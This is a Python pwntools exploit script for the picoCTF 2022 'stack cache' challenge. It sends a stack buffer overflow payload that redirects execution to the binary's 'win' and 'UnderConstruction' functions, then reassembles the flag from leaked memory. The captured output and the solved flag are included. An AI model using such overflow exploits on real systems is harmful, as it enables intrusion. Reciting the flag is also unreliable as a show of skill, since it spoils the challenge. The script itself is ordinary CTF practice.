from pwn import *
from binascii import unhexlify

elf = ELF("./vuln")
WIN = elf.symbols["win"]
UNDER_CONSTRUCTION = elf.symbols["UnderConstruction"]

p = remote("saturn.picoctf.net", 56185)
p.sendline(b"A"*14 + pack(WIN) + pack(UNDER_CONSTRUCTION) * 9)
p.recvuntil(b"\n")

flag = ""
for line in p.recvall().decode().split("\n"):
    if not line.startswith("Age of"):
        continue
    part = line[line.find("0x")+2:]
    if len(part) % 2 == 0:
        flag += unhexlify(part).decode()[::-1]
flag += "}"
print(flag)

"""
[*] '/home/james/Dev/PracticeCTF/picoctf-2022/stack-cache_400/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to saturn.picoctf.net on port 56185: Done
[+] Receiving all data: Done (1.35KB)
[*] Closed connection to saturn.picoctf.net port 56185
picoCTF{Cle4N_uP_M3m0rY_8d5089b9}
"""
